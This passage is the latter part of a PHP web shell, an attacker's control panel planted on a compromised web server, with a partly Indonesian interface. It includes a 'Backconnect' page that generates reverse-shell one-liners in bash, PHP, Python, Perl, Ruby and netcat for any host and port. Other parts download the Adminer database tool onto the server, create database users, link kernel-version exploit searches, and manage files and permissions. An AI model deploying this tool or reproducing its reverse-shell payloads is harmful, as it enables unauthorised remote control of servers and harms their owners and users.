                            if ($stmt2->execute()) {
                                echo '<div class="msg" style="margin-top: 15px;">✓ User created successfully!</div>';
                            }
                        }
                        $conn->close();
                    }
                } catch (Exception $e) {
                    echo '<div class="msg" style="margin-top: 15px; border-color: #ff4444; color: #ff4444;">✗ Error!</div>';
                }
            }
            ?>

        <!-- ADMINER -->
        <?php elseif ($_GET['page'] === 'adminer'): ?>
            <h2 style="color: #00ff88; margin-bottom: 20px;">🗄️ Adminer</h2>
            <p>Mengunduh Adminer...</p>
            <?php
            $adminer_url = 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php';
            $adminer_path = $current_dir . '/adminer.php';
            
            if (!file_exists($adminer_path)) {
                $content = @file_get_contents($adminer_url);
                if ($content) {
                    file_put_contents($adminer_path, $content);
                    echo '<div class="msg">✓ Adminer downloaded! <a href="?dir=' . base64_encode($current_dir) . '">Back</a></div>';
                } else {
                    echo '<div class="msg" style="border-color: #ff4444; color: #ff4444;">✗ Failed to download</div>';
                }
            } else {
                echo '<div class="msg">✓ Adminer already exists!</div>';
            }
            ?>

        <!-- BACKCONNECT -->
        <?php elseif ($_GET['page'] === 'backconnect'): ?>
            <h2 style="color: #00ff88; margin-bottom: 20px;">🔌 Backconnect</h2>
            <form method="POST" style="max-width: 600px;">
                <div class="modal-body">
                    <select name="bc_type" style="width: 100%; padding: 8px; background: #22242d; border: 1px solid #00ff88; color: #fff; border-radius: 4px; margin-bottom: 10px; font-family: monospace;">
                        <option value="">- Choose Type -</option>
                        <option value="bash">Bash</option>
                        <option value="php">PHP</option>
                        <option value="python">Python</option>
                        <option value="perl">Perl</option>
                        <option value="ruby">Ruby</option>
                        <option value="nc">Netcat</option>
                    </select>
                    <input type="text" name="bc_host" placeholder="Target Host" required>
                    <input type="number" name="bc_port" placeholder="Target Port" required>
                    <button type="submit" name="gen_bc" class="btn">Generate</button>
                </div>
            </form>
            <?php
            if (isset($_POST['gen_bc'])) {
                $host = $_POST['bc_host'];
                $port = $_POST['bc_port'];
                $type = $_POST['bc_type'];
                
                $commands = [
                    'bash' => "bash -i >& /dev/tcp/$host/$port 0>&1",
                    'php' => "\$sock=fsockopen('$host',$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");",
                    'python' => "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$host\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                    'perl' => "perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($port,inet_aton(\"$host\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
                    'ruby' => "ruby -rsocket -e 'f=TCPSocket.open(\"$host\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                    'nc' => "nc -e /bin/sh $host $port"
                ];
                
                if (isset($commands[$type])) {
                    echo '<div class="terminal-output" style="margin-top: 15px;">
                        <pre>' . htmlspecialchars($commands[$type]) . '</pre>
                    </div>';
                }
            }
            ?>

        <!-- LINUX EXPLOIT -->
        <?php elseif ($_GET['page'] === 'exploit'): ?>
            <h2 style="color: #00ff88; margin-bottom: 20px;">💊 Linux Exploit Finder</h2>
            <div class="terminal-output">
                <strong>Kernel Version:</strong> <?php echo get_kernel_version(); ?><br><br>
                <strong>Search on ExploitDB:</strong><br>
                <a href="https://www.exploit-db.com/search?q=<?php echo urlencode(get_kernel_version()); ?>" target="_blank" style="color: #00ff88;">
                    🔗 Click here to search for exploits
                </a>
            </div>

        <?php endif; ?>
    </div>
</div>

<!-- MODALS -->
<!-- Mkdir Modal -->
<div class="modal" id="mkdir_modal">
    <div class="modal-container">
        <div class="modal-header">📁 Create New Folder</div>
        <form method="POST" class="modal-body">
            <input type="text" name="folder_name" placeholder="Folder name" required>
            <div class="modal-buttons">
                <button type="submit" name="mkdir">Create</button>
                <button type="button" onclick="closeModal('mkdir_modal')">Cancel</button>
            </div>
        </form>
    </div>
</div>

<!-- Mkfile Modal -->
<div class="modal" id="mkfile_modal">
    <div class="modal-container">
        <div class="modal-header">📄 Create New File</div>
        <form method="POST" class="modal-body">
            <input type="text" name="file_name" placeholder="File name" required>
            <div class="modal-buttons">
                <button type="submit" name="mkfile">Create</button>
                <button type="button" onclick="closeModal('mkfile_modal')">Cancel</button>
            </div>
        </form>
    </div>
</div>

<!-- Rename Modal -->
<div class="modal" id="rename_modal">
    <div class="modal-container">
        <div class="modal-header">↻ Rename File</div>
        <form method="POST" class="modal-body">
            <input type="hidden" name="old_name" id="rename_old">
            <input type="text" name="new_name" id="rename_new" placeholder="New name" required>
            <div class="modal-buttons">
                <button type="submit" name="rename_submit">Rename</button>
                <button type="button" onclick="closeModal('rename_modal')">Cancel</button>
            </div>
        </form>
    </div>
</div>

<!-- Chmod Modal -->
<div class="modal" id="chmod_modal">
    <div class="modal-container">
        <div class="modal-header">🔒 Change Permissions</div>
        <form method="POST" class="modal-body">
            <input type="hidden" name="chmod_file" id="chmod_file">
            <input type="text" name="chmod_value" placeholder="e.g., 0755" required>
            <div class="modal-buttons">
                <button type="submit" name="chmod_submit">Change</button>
                <button type="button" onclick="closeModal('chmod_modal')">Cancel</button>
            </div>
        </form>
    </div>
</div>

<script>
function openModal(modal) {
    document.getElementById(modal + '_modal').style.display = 'block';
}

function closeModal(modal) {
    document.getElementById(modal).style.display = 'none';
}

function openRename(filename) {
    document.getElementById('rename_old').value = JSON.parse(filename);
    document.getElementById('rename_new').value = JSON.parse(filename);
    openModal('rename');
}

function openChmod(filename) {
    document.getElementById('chmod_file').value = JSON.parse(filename);
    openModal('chmod');
}

window.onclick = function(e) {
    if (e.target.classList.contains('modal')) {
        e.target.style.display = 'none';
    }
}

document.getElementById('file_input')?.addEventListener('change', function() {
    if (document.getElementById('real_file_input')) {
        document.getElementById('real_file_input').files = this.files;
        document.getElementById('upload_form').submit();
    }
});
</script>
</body>
</html>

<?php
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ?');
    exit;
}
